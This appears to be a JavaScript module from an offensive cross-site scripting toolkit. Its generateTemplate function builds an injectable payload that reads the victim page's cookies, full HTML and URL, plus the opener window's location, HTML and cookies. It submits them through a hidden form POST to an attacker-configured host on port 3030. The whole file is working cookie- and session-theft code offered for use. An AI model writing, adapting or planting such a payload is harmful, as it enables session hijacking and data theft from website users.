
function determineInstrusive(config) {
  const capture = {};
  capture.cookie = config.intrusiveLevel === 1 ? 'document.cookie' : 'null';
  capture.documentBody = config.intrusiveLevel === 1 ? 'document.body.parentNode.innerHTML' : 'null';
  capture.url = config.intrusiveLevel === 1 ? 'document.URL' : 'document.URL';
  capture.location = config.intrusiveLevel === 1 ? 'opener.location' : 'opener.location';
  capture.openerBody = config.intrusiveLevel === 1 ? 'opener.document.body.innerHTML' : 'null';
  capture.openerCookie = config.intrusiveLevel === 1 ? 'opener.document.cookie' : 'null';
  return capture;
}

exports.generateTemplate = (config) => {
  const capture = determineInstrusive(config);
  const template = `(function(){
        if(window.name!=='__'){
      
                  try {dcoo = ${capture.cookie}} catch(e) {dcoo=null}
                  try {inne = ${capture.documentBody}} catch(e) {inne=null}
                  try {durl = ${capture.url}} catch(e) {durl=null}
                  try {oloc = ${capture.location}} catch(e) {oloc=null}
                  try {oloh = ${capture.openerBody}} catch(e) {oloh=null}
                  try {odoc = ${capture.openerCookie}} catch(e) {odoc=null}
      
                  var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
            var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
                  var body = document.getElementsByTagName('body')[0];
      
            __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc));
            __.setAttribute('name','_');
            _.appendChild(__);
            _.action='//${config.url}:3030/m';
            _.method='post';
                  //_.target='_blank';
      
            body.appendChild(_);
            window.name='__';
            _.submit();
            //history.back();
        } else {window.name=''}
      })();`;

  return template;
};
